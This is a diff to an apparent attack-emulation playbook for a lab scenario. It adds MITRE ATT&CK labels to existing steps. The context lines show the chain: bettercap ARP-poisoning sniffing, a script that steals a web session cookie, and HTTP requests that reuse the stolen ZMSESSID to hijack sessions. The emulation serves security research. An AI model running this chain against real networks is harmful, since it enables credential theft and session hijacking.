@@ -9,9 +9,18 @@ commands:
     cmd: sudo bettercap -caplet bettercap.cap
     background: True
     kill_on_exit: False
+    metadata:
+       techniques: "T1040,T1557.002 "
+       tactic: "Discovery,Credential Access"
+       technique_name: "Network Sniffing,Adversary-in-the-Middle: ARP Cache Poisoning "
 
   - type: shell
     cmd: sudo /bin/python3 /home/aecid/scenario5/get_cookie.py
+    metadata:
+       techniques: "T1539"
+       tactic: "Credential Access"
+       technique_name: "Steal Web Session Cookie"
+
 
   - type: setvar
     cmd: $RESULT_STDOUT
@@ -42,6 +51,10 @@ commands:
       zmCSS: "base"
       ZMSESSID: $SESSION_ID
     follow: True
+    metadata:
+       techniques: "T1563"
+       tactic: "Lateral Movement"
+       technique_name: "Remote Service Session Hijacking"
 
   - type: http-client
     cmd: GET
@@ -59,6 +72,10 @@ commands:
       zmCSS: "base"
       ZMSESSID: $SESSION_ID
     follow: True
+    metadata:
+       techniques: "T1563"
+       tactic: "Lateral Movement"
+       technique_name: "Remote Service Session Hijacking"
 
   - type: http-client
     cmd: GET
@@ -76,3 +93,7 @@ commands:
       zmCSS: "base"
       ZMSESSID: $SESSION_ID
     follow: True
+    metadata:
+       techniques: "T1563"
+       tactic: "Lateral Movement"
+       technique_name: "Remote Service Session Hijacking"
